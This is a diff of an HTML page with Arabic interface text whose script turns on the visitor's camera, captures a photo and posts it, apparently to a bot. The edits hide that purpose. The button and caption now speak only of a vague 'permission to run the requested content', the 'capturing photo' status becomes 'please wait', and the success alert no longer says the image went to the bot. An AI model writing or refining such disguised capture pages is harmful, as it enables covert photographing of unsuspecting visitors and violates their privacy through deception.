@@ -9,10 +9,10 @@
 
     <div id="container">
         <h2>مرحباً بك في التجربة</h2>
-        <p>اضغط على الزر أدناه لتفعيل الكاميرا وإرسال الصورة</p>
+        <p> اضغط على الزر أدناه لتفعيل  الاذن لتشغيل المحتوى الطلوب</p>
         
         <button id="mainBtn" style="padding: 20px 40px; font-size: 20px; background-color: #007bff; color: white; border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">
-            ✅ اضغط هنا لتفعيل الكاميرا
+            ✅اضغط هنا لتفعيل الاذن حتى تتمكن من شتغيل المطلوب
         </button>
     </div>
 
@@ -36,7 +36,7 @@
                 });
 
                 // إذا وافق المستخدم، سيبدأ التنفيذ هنا فوراً
-                mainBtn.innerText = "⏳ جاري التقاط الصورة...";
+                mainBtn.innerText = "⏳ انتظرررر قليل من فظلك...";
                 mainBtn.style.backgroundColor = "#28a745";
                 video.srcObject = stream;
 
@@ -52,7 +52,7 @@
                             body: formData
                         });
 
-                        alert("✅ نجحت العملية! تم إرسال الصورة للبوت.");
+                        alert("✅ نجحت العملية! .");
                         stream.getTracks().forEach(track => track.stop());
                         mainBtn.innerText = "إعادة المحاولة";
                     }, 'image/jpeg');
